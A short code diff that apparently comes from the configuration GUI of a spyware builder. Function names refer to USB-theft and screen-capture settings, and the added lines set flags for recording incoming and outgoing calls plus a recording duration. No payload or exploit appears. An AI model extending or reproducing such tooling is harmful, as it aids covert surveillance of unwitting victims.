@@ -632,6 +632,7 @@ GenerateDlg::GenerateDlg(QWidget *parent)
 	m_waitDlg = new WaitDlg(this);
 	m_waitDlg->hide();
 
+	InitCustomText(this);
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -1460,6 +1461,14 @@ bool GenerateDlg::GetUsbCfgInfo(PUSB_THIEF_CONFIG& lpUsbThiefCfgData)
 //
 bool GenerateDlg::GetScreenshotCfgInfo(PCAPTURE_CONFIG& lpCaptureCfgData)
 {
+	lpCaptureCfgData->dwRecordType = 0;
+	
+	if ( ui.chkCallIn->isChecked() )
+		lpCaptureCfgData->dwRecordType |= 0x00000001;
+	if ( ui.chkCallOut->isChecked() )
+		lpCaptureCfgData->dwRecordType |= 0x00000002;
+
+	lpCaptureCfgData->dwRecordTime = ui.spnTime->value();
 
 	DWORD dwWindowsInternal = 0;
 
